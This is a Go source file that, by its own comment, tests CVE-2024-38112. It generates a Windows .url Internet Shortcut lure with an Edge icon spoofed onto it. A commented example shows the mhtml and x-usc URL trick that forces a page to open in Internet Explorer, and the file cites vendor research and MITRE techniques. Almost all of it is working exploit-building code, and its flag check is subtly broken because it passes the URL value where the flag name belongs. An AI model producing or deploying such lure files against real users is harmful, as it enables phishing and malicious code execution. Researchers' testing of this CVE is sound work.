package main

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o createURLShortcut.bin -ldflags "-w -s" main.go

/*
Built this quick golang prog to test CVE-2024-38112

References:
https://research.checkpoint.com/2024/resurrecting-internet-explorer-threat-actors-using-zero-day-tricks-in-internet-shortcut-file-to-lure-victims-cve-2024-38112/
https://www.trendmicro.com/en_us/research/24/g/CVE-2024-38112-void-banshee.html


MITRE:
T1204.002 - User Execution: Malicious File
T1218 - System Binary Proxy Execution

*/

import (
	"flag"
	"fmt"
	"os"
)

func isFlagPassed(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

func main() {
	var content string
	urlFlag := flag.String("url", "http://127.0.0.1", "Specify the URL for the shortcut")
	filenameFlag := flag.String("file", "myshortcut.url", "Filename for the shortcut created")
	flag.Parse()
	//url := "mhtml:https://www.testurl.com!x-usc:https://www.testurl.com"
	//filename := "myshortcut.url"

	// Check if a url is passed as a command-line option
	if isFlagPassed(*urlFlag) {
		fmt.Println("The URL to embed in the shortcut needs to be specified")
		flag.Usage()
		os.Exit(1)
	}

	content += "[{000214A0-0000-0000-C000-000000000046}]\n"
	content += "Prop3=19,0\n"
	content += "[InternetShortcut]\n"
	content += "IDList=\n"
	content += fmt.Sprintf("URL=%s\n", *urlFlag)
	content += "HotKey=0\n"
	content += "IconIndex=13\n"
	content += "IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"

	//fmt.Println(*filenameFlag)
	file, err := os.Create(*filenameFlag)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(content)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("Shortcut created successfully!")
}
